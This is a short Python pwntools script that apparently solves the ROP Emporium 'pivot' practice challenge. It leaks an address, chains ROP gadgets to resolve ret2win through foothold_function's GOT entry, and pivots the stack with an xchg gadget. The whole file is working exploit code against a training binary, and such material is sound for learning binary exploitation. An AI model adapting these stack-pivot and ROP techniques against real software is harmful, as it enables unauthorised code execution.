from pwn import *

context.log_level="debug"

e1 = ELF("./pivot")
e2 = ELF("./libpivot.so")

foothold_function_plt = e1.plt["foothold_function"]
foothold_function_got = e1.got["foothold_function"]
foothold_function_sym = e2.symbols["foothold_function"]
ret2win_sym = e2.symbols["ret2win"]
offset = ret2win_sym - foothold_function_sym

# 0x0000000000400a39 : leave ; ret
# 0x0000000000400b00 : pop rax ; ret
# 0x0000000000400900 : pop rbp ; ret
# 0x0000000000400b09 : add rax, rbp ; ret
# 0x000000000040098e : call rax
# 0x0000000000400b05 : mov rax, qword ptr [rax] ; ret
# 0x0000000000400b02 : xchg rax, rsp ; ret
# 0x0000000000400b00 : pop rax ; ret


#the byte 0x0a will truncate the payload
leave_ret = p64(0x0000000000400a39)
pop_rax = p64(0x0000000000400b00)
pop_rbp = p64(0x0000000000400900)
add_rax_rbp = p64(0x0000000000400b09)
call_rax = p64(0x000000000040098e)
mov_rax_rax = p64(0x0000000000400b05)
xchg_rax_rsp = p64(0x0000000000400b02)
pop_rax = p64(0x0000000000400b00)


p = process("./pivot")
print p.recvuntil("pivot: ")
leak_addr = int(p.recvline(), 16)
print hex(leak_addr)
p.recv()

payload = p64(foothold_function_plt)
payload += pop_rax
payload += p64(foothold_function_got)
payload += mov_rax_rax
payload += pop_rbp
payload += p64(offset)
payload += add_rax_rbp
payload += call_rax

raw_input()
p.sendline(payload)
print p.recv()

pivot_payload = "a"*40
pivot_payload += pop_rax
pivot_payload += p64(leak_addr)
pivot_payload += xchg_rax_rsp
p.sendline(pivot_payload)

print p.recv()

p.interactive()
